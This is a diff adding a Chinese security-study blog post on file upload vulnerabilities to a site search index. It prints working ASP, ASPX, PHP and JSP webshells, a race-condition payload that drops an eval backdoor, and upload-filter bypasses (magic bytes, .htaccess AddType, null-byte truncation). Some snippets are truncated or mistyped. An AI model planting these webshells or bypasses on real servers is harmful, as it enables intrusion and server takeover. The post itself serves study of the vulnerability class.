@@ -108,4 +108,34 @@
 </ul>
 ]]></content>
   </entry>
+  <entry>
+    <title>网络安全学习之文件上传</title>
+    <url>/2022/08/08/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/</url>
+    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="文件上传"><a href="#文件上传" class="headerlink" title="文件上传"></a>文件上传</h1><h2 id="文件上传漏洞"><a href="#文件上传漏洞" class="headerlink" title="文件上传漏洞"></a>文件上传漏洞</h2><ul>
+<li>简介：现代互联网的Web应用程序中，上传文件是一种常见的功能，因为它有助于提高业务效率，如果Web应用存在文件上传漏洞，那么恶意用户就可以利用文件上传漏洞将可执行脚本程序（WebShell）上传到服务器中，获得网站的权限，然后可以进一步对服务器进行入侵，扩大控制权限。  </li>
+<li>漏洞产生原因：<br>上传文件时，如果服务器端没有对客户端上传的文件进行严格的检验或过滤，就容易造成可上传任意文件的情况，包括上传脚本文件（asp，aspx，php，jsp）  </li>
+<li>漏洞的危害：<br>非法用户可以利用上传的脚本文件控制整个网站，甚至控制服务器。这个恶意的脚本文件，又被称为WebShell，也可将WebShell脚本称为一种网页后门，WebShell脚本具有非常强大的功能，比如查看服务器目录、服务器中的文件，执行系统命令等。</li>
+<li>ASP  <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">&lt;%<span class="built_in">eval</span> request(<span class="string">&quot;x&quot;</span>)%&gt;//密码是‘x’</span><br><span class="line">&lt;%execute request(<span class="string">&quot;x&quot;</span>)%&gt;</span><br></pre></td></tr></table></figure></li>
+<li>ASPX  <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">&lt;%@ Page Language=<span class="string">&quot;Jscript&quot;</span>%&gt;&lt;%<span class="built_in">eval</span>(Request.Item[<span class="string">&quot;x&quot;</span>],<span class="string">&quot;unsafe&quot;</span>);%&gt;</span><br></pre></td></tr></table></figure></li>
+<li>PHP  <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">&lt;?php <span class="built_in">eval</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;x&#x27;</span>])?&gt;  //比较标准的用法；不一定是post，也可以是get</span><br><span class="line">&lt;?php assert(<span class="variable">$_POST</span>[<span class="string">&#x27;x&#x27;</span>];?)&gt;  //php版本&gt;7时不能用了</span><br></pre></td></tr></table></figure></li>
+<li>JSP CMD WebShall  <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;%  </span><br><span class="line">    if(&quot;x&quot;.equals(request.getParameter(&quot;pwd&quot;)))</span><br><span class="line">    &#123;</span><br><span class="line">        java.io.InputStream in=Runtime.getRuntime().exec(request.getParameter(&quot;i&quot;)).getInp</span><br><span class="line">        int a=-1;</span><br><span class="line">        byte[] b=new byte[2048];</span><br><span class="line">        out.print(&quot;&lt;pre&gt;&quot;);</span><br><span class="line">        while((a=in.read(b))!=-1)</span><br><span class="line">        &#123;</span><br><span class="line">            out.println(new String(b));</span><br><span class="line">        &#125;</span><br><span class="line">        out.print(&quot;&lt;/pre&gt;&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">%&gt;</span><br></pre></td></tr></table></figure></li>
+<li>文件上传漏洞的条件<br>首先，上传的文件能够被Web容器解释执行。所以文件上传后所在的目录要是Web容器所覆盖到的路径<br>其次，用户能够从Web上访问这个文件。如果文件上传了，但用户无法通过Web访问，或者无法使得Web容器解释这个脚本，那么也就不能被称之为漏洞<br>最后，用户上传的文件若被安全检查、格式化、图片压缩等功能改变了内容，也可能导致攻击不成功  <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php system(&#x27;whoami&#x27;);?&gt;</span><br><span class="line">&lt;?php eval($_GET[1]);?&gt;</span><br><span class="line">?1=system(whoami);</span><br><span class="line">&lt;?php eval(system(whoami););?&gt;</span><br><span class="line">$_GET=&gt;接受GET参数</span><br><span class="line">$_POST=&gt;接受POST参数</span><br><span class="line">$_REQUEST=&gt;接受GET参数 POST Cookie 参数</span><br></pre></td></tr></table></figure></li>
+</ul>
+<h2 id="中国蚁剑antsword使用的是POST接受参数，PHP木马使用的eval"><a href="#中国蚁剑antsword使用的是POST接受参数，PHP木马使用的eval" class="headerlink" title="中国蚁剑antsword使用的是POST接受参数，PHP木马使用的eval"></a>中国蚁剑antsword使用的是POST接受参数，PHP木马使用的eval</h2><h2 id="文件头绕过："><a href="#文件头绕过：" class="headerlink" title="文件头绕过："></a>文件头绕过：</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">JPEG(jpg), 文件头：FFD8FF</span><br><span class="line">PNG(png), 文件头：89504E47</span><br><span class="line">GIF(gig), 文件头：47494638</span><br><span class="line">HTML(html), 文件头：68746D6C3E</span><br><span class="line">ZIP Archive(Zip), 文件头：504B0304</span><br><span class="line">RAR Achive(rar), 文件头：52617221</span><br><span class="line">Adobe Acrobat(pdf), 文件头：255044462D312E</span><br><span class="line">MS Word/Excel(xls.or.doc), 文件头：D0CF11E0</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>白名单策略：只允许上传xxx后缀  jpg jpeg png gif<br>黑名单策略：不允许上传xxx后缀<br>白名单是设置能通过用户，黑名单是设置不能通过用户，所以一般情况下，白名单比黑名单限制的用户多些</li>
+</ul>
+<h2 id="htaccess："><a href="#htaccess：" class="headerlink" title=".htaccess："></a>.htaccess：</h2><ul>
+<li>是Apache服务器中的一个配置文件，它负责相关目录下的网页配置。通过htaccess文件，可以帮我们实现：网页301重定向，自定义404错误页面，改变文件扩展名，允许&#x2F;组织特定的用户或目录的访问，禁止默认列表，配置默认文档等功能。</li>
+<li>grep -r “application&#x2F;x-httpd-php” &#x2F;etc<br>手动查询etc目录下包含”application&#x2F;x-httpd-php”的文件  </li>
+<li>htaccess解析规则<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$ cat .htaccess</span><br><span class="line">AddType application/x-httpd-php .png</span><br></pre></td></tr></table></figure></li>
+<li>PHP内核是由C语言实现的，所以使用了C语言中一些字符串处理函数，比如在连接字符串的时候，0字节（\x00）将作为字符串结束符。所以在这个地方，攻击者只要在最后加入一个0字节，就能截断file变量之后的字符串<br>00 截断常配合目录截断</li>
+</ul>
+<h2 id="条件竞争"><a href="#条件竞争" class="headerlink" title="条件竞争"></a>条件竞争</h2><ul>
+<li>简介 ：是一个系统的运行结果不受控制时间的先后顺序。当这些不受控制的事件没有按照开发者想要的方式运行的时候，就可能出现bug，尤其在当我们的系统中大量对资源进行共享，，如果处理不当就会产生条件竞争漏洞。<br>攻击者上传了一个用来生成恶意shell的文件，在上传完成和安全检查完成并删除他的间隙，攻击者通过不断的发起访问请求的方法访问了该文件，该文件就会被执行，并且在服务器上生成一个恶意的shell文件，至此该文件的任务就已全部完成，至于后面发现它是一个不安全的文件并把他删除的问题就已经不重要了，因为攻击者已经成功地在服务器中植入了一个shell文件，后续的一切就都不是问题了。<br>不过竞争的马因为生存周期短的原因，所以和普通的webshell不太一样，他的使命是在有限的生命等待有缘人的光顾，然后快速生成一个小webshell。这类WebShell大体内容如下：<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php fputs(fopen(&#x27;xiao,php&#x27;,&#x27;w&#x27;),&#x27;&lt;?php eval($_REQUEST(1));?&gt;&#x27;);?&gt;</span><br></pre></td></tr></table></figure></li>
+</ul>
+<h2 id="写入IDAT数据块"><a href="#写入IDAT数据块" class="headerlink" title="写入IDAT数据块"></a>写入IDAT数据块</h2><p>PNG也是可以通过IDAT数据块来绕过渲染的。</p>
+]]></content>
+  </entry>
 </search>
